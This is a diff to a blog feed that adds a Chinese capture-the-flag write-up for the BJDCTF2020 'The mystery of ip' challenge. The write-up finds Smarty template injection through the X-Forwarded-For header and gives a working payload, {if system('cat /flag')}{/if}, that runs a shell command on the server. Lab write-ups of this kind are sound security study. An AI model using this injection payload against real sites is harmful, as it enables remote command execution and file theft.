@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>BUU每日一题036</title>
+    <link href="/2021/02/24/BUU036/"/>
+    <url>/2021/02/24/BUU036/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BJDCTF2020]The mystery of ip<img src="https://ftp.bmp.ovh/imgs/2021/02/feab62e0498a143e.png">     </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>flag页面抓包<br>提示的IP<br>加个<code>X-Forwarded-For</code><br>先试了试<code>127.0.0.1</code>——–&gt;返回<code>127.0.0.1</code><br>又试了试<code>127</code>———&gt;返回<code>127</code><br>模板注入？？？<br><code>&#123;&#123;7*7&#125;&#125;</code>———-&gt;<code>49</code><br>是模板注入了<br>但不是python了，是PHP的smarty模板<br>{if}{/if}标签       </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>&#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;</code>       </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>{if}标签        <blockquote><p>Smarty的<code>&#123;if&#125;</code>条件判断和PHP的if非常相似，只是增加了一些特性。每个<code>&#123;if&#125;</code>必须有一个配对的<code>&#123;/if&#125;</code>，也可以使用<code>&#123;else&#125;</code> 和 <code>&#123;elseif&#125;</code>，全部的PHP条件表达式和函数都可以在if内使用，如<code>||*, or, &amp;&amp;,</code> and, <code>is_array()</code>, 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></p></blockquote></li></ul>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题035</title>
     <link href="/2021/02/23/BUU035/"/>
     <url>/2021/02/23/BUU035/</url>
